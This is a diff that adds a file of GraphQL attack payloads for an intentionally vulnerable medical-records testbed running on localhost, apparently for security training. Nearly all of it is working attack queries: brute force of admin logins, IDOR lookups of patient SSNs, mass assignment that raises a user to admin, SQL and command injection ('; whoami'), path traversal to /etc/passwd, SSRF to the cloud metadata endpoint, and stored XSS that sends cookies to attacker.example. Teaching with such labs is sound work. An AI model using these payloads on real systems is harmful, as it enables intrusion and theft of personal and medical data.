@@ -1,0 +1,339 @@
+# =============================================================================
+# Example payloads for the testbed.
+#
+# Run against http://localhost:4000/graphql with TEST_MODE=LAB_FULLY_VULNERABLE.
+# Identifiers (A1, B1, C1, ...) match the entries in VULNERABILITIES.md.
+# =============================================================================
+
+
+# -----------------------------------------------------------------------------
+# A. GraphQL-specific
+# -----------------------------------------------------------------------------
+
+# A1. Introspection enabled - dump the schema.
+query A1_Introspection {
+  __schema {
+    types { name kind }
+    queryType { name fields { name args { name type { name } } } }
+    mutationType { name fields { name args { name type { name } } } }
+  }
+}
+
+# A2. GraphQL Playground enabled.
+# No query needed. Browse to http://localhost:4000/graphql and the
+# in-browser IDE is served. Only available when playgroundEnabled = true.
+
+# A3. Debug mode and verbose errors. Trigger a runtime error and observe the
+# stack trace and originalError fields in the response extensions.
+query A3_VerboseErrors {
+  patient(id: "does-not-exist") { name }
+  readFile(filename: "/this/path/does/not/exist") { content }
+}
+
+# A4. No query depth limit - arbitrarily deep nesting is accepted.
+query A4_DeepNesting {
+  patient(id: "1") {
+    appointments {
+      patient {
+        appointments {
+          patient {
+            appointments {
+              patient { name }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+# A5. No cost / complexity analysis - heavy fan-out with aliases.
+query A5_NoCostAnalysis {
+  a: patients { medicalRecords { data } prescriptions { medication } appointments { reason } }
+  b: patients { medicalRecords { data } prescriptions { medication } appointments { reason } }
+  c: patients { medicalRecords { data } prescriptions { medication } appointments { reason } }
+  d: patients { medicalRecords { data } prescriptions { medication } appointments { reason } }
+  e: patients { medicalRecords { data } prescriptions { medication } appointments { reason } }
+}
+
+# A6. No request rate limiting. Replay this query in a loop; the server
+# keeps responding without throttling.
+query A6_NoRateLimit {
+  users { id }
+}
+
+# A7. Circular query DoS via User.friends.
+query A7_CircularFriends {
+  users {
+    friends {
+      friends {
+        friends {
+          friends { id username }
+        }
+      }
+    }
+  }
+}
+
+# A8. Excessive data exposure on User.
+query A8_UserExposure {
+  users {
+    id username email role
+    password ssn creditCard salary department
+  }
+}
+
+# A9. Excessive data exposure on Patient.
+query A9_PatientExposure {
+  patients {
+    id name dateOfBirth ssn address phone bloodType
+    insuranceNumber balance medicalHistory
+  }
+}
+
+# A10. BOLA / IDOR by patient id.
+query A10_BolaById {
+  patient(id: "1") { name ssn medicalHistory }
+}
+
+# A11. BOLA / IDOR by SSN lookup.
+query A11_BolaBySsn {
+  patientBySSN(ssn: "111-22-3333") {
+    name address phone insuranceNumber medicalHistory
+  }
+}
+
+# A12. Login alias brute force - many guesses in a single request.
+mutation A12_AliasBruteForce {
+  a: login(username: "admin", password: "admin") { token }
+  b: login(username: "admin", password: "admin123") { token }
+  c: login(username: "admin", password: "password") { token }
+  d: login(username: "admin", password: "12345678") { token }
+  e: login(username: "admin", password: "letmein") { token }
+}
+
+# A13. Unrestricted batched mutations - one round trip, many writes.
+mutation A13_BatchedMutations {
+  m1: addComment(patientId: "1", comment: "<script>alert(1)</script>") { id }
+  m2: addComment(patientId: "2", comment: "<img src=x onerror=alert(2)>") { id }
+  m3: addComment(patientId: "3", comment: "<svg onload=alert(3)>") { id }
+}
+
+
+# -----------------------------------------------------------------------------
+# B. Authentication and access control
+# -----------------------------------------------------------------------------
+
+# B1. Hard-coded JWT secret. Take a token returned by login and decode it
+# at jwt.io with HS256 secret = "secret123". The signature verifies.
+mutation B1_GetToken {
+  login(username: "admin", password: "admin123") { token }
+}
+
+# B2. JWT signed without expiry by default. Decode the token from B1 and
+# observe the missing `exp` claim under LAB_FULLY_VULNERABLE.
+
+# B3. Invalid tokens are silently downgraded to anonymous.
+# Send any GraphQL request with header:
+#   Authorization: Bearer this.is.not.a.valid.token
+# Under LAB profile (strictTokenValidation = false) the request still
+# succeeds as anonymous.
+query B3_BogusToken {
+  me { id username role }
+}
+
+# B4. Username enumeration on login.
+mutation B4_EnumerateUsername {
+  exists: login(username: "admin", password: "wrong") { token }
+  missing: login(username: "no_such_user", password: "x") { token }
+}
+
+# B5. Weak password policy - single-character passwords accepted.
+mutation B5_WeakPassword {
+  register(username: "weakpw_user", password: "a", email: "weak@example.com") {
+    token user { id username }
+  }
+}
+
+# B6. No brute-force protection. Repeat this mutation rapidly without
+# triggering rate limiting.
+mutation B6_BruteForce {
+  login(username: "admin", password: "guess1") { token }
+}
+
+# B7. Privilege escalation through hard-coded admin secret.
+mutation B7_PromoteToAdmin {
+  promoteToAdmin(userId: "4", secretKey: "admin_key_12345") {
+    id username role
+  }
+}
+
+# B8. Mass assignment on updateUser - elevate role and salary.
+mutation B8_MassAssignUser {
+  updateUser(id: "4", role: ADMIN, salary: 999999) {
+    id username role salary
+  }
+}
+
+# B9. Mass assignment on updatePatient - rewrite SSN and balance.
+mutation B9_MassAssignPatient {
+  updatePatient(id: "1", input: {
+    ssn: "000-00-0000",
+    balance: 0,
+    medicalHistory: "OWNED"
+  }) {
+    id name ssn balance medicalHistory
+  }
+}
+
+
+# -----------------------------------------------------------------------------
+# C. Injection
+# -----------------------------------------------------------------------------
+
+# C1. SQLi-style filter bypass.
+query C1_SqliBypass {
+  searchPatients(query: "' OR '1'='1") { id name ssn }
+}
+
+# C2. Command injection via ping.
+query C2_PingCmdInjection {
+  ping(host: "127.0.0.1; whoami") { output error }
+}
+
+# C3. Direct command execution.
+query C3_DirectCommand {
+  systemDiagnostics(command: "whoami") { output error }
+}
+
+mutation C3_DebugCommand {
+  executeDebugCommand(cmd: "whoami") { output error }
+}
+
+# C4. Path traversal on read / list.
+query C4_PathTraversalRead {
+  readFile(filename: "../../../etc/passwd") { filename content }
+}
+
+query C4_PathTraversalList {
+  listDirectory(path: "/")
+}
+
+# C5. Arbitrary file upload escaping the uploads directory.
+mutation C5_UploadEscape {
+  uploadFile(filename: "../../escaped.txt", content: "pwned") {
+    id path
+  }
+}
+
+# C6. Stored XSS payloads.
+mutation C6_XssComment {
+  addComment(patientId: "1", comment: "<script>fetch('https://attacker.example/?c='+document.cookie)</script>") {
+    id name medicalHistory
+  }
+}
+
+mutation C6_XssBio {
+  updateBio(userId: "1", bio: "<img src=x onerror=alert(1)>") {
+    id username
+  }
+}
+
+
+# -----------------------------------------------------------------------------
+# D. Information disclosure
+# -----------------------------------------------------------------------------
+
+# D1. systemInfo leaks env, platform, memory, uptime.
+query D1_SystemInfo {
+  systemInfo {
+    version nodeVersion platform uptime memoryUsage cpuInfo
+    serverEnvironment
+  }
+}
+
+# D2. debugInfo dumps the entire in-memory store.
+query D2_DebugInfo {
+  debugInfo
+}
+
+# D3. serverConfig exposes runtime configuration.
+query D3_ServerConfig {
+  serverConfig
+}
+
+# D4. Verbose error stack traces. Force an exception and inspect
+# response.errors[*].extensions.stacktrace and originalError.
+query D4_StackTrace {
+  readFile(filename: "/path/that/does/not/exist") { content }
+}
+
+# D5. securityProfile reveals which dangerous toggles are active.
+query D5_ProfileLeak {
+  securityProfile {
+    mode description
+    introspectionEnabled debugEnabled
+    allowCommandExecution allowSSRF allowDangerousReadOps
+    allowMassAssignment weakPasswordPolicy rateLimitLogin
+    hideSensitiveFields strictTokenValidation
+  }
+}
+
+
+# -----------------------------------------------------------------------------
+# E. Configuration and integration
+# -----------------------------------------------------------------------------
+
+# E1. SSRF via fetchExternalData.
+query E1_SsrfLoopback {
+  fetchExternalData(url: "http://127.0.0.1:4000/.well-known/apollo/server-health") {
+    statusCode body
+  }
+}
+
+query E1_SsrfMetadata {
+  fetchExternalData(url: "http://169.254.169.254/latest/meta-data/") {
+    statusCode body
+  }
+}
+
+# E2. SSRF via webhooks.
+mutation E2_SetWebhook {
+  setWebhook(url: "http://169.254.169.254/latest/meta-data/")
+}
+
+mutation E2_TriggerWebhook {
+  triggerWebhook(data: "ping") { statusCode body }
+}
+
+# E3. Command injection in backup / restore.
+mutation E3_BackupRce {
+  backupDatabase(destination: "out.txt; whoami") { output error }
+}
+
+mutation E3_RestoreRce {
+  restoreDatabase(source: "/etc/passwd") { output error }
+}
+
+# E4. CSRF-friendly state-changing mutation - no token, no role check.
+mutation E4_TransferBalance {
+  transferBalance(fromPatientId: "3", toPatientId: "1", amount: 3200.50)
+}
+
+
+# -----------------------------------------------------------------------------
+# Testbed helpers
+# -----------------------------------------------------------------------------
+
+query CurrentProfile {
+  securityProfile { mode description }
+}
+
+query AssessmentLog {
+  assessmentSummary { totalEvents criticalEvents highEvents mediumEvents lowEvents }
+  assessmentEvents(limit: 25) { timestamp category vector severity payload actor }
+}
+
+mutation ResetState {
+  resetTestData(confirmPhrase: "reset-test-data-confirmed")
+}
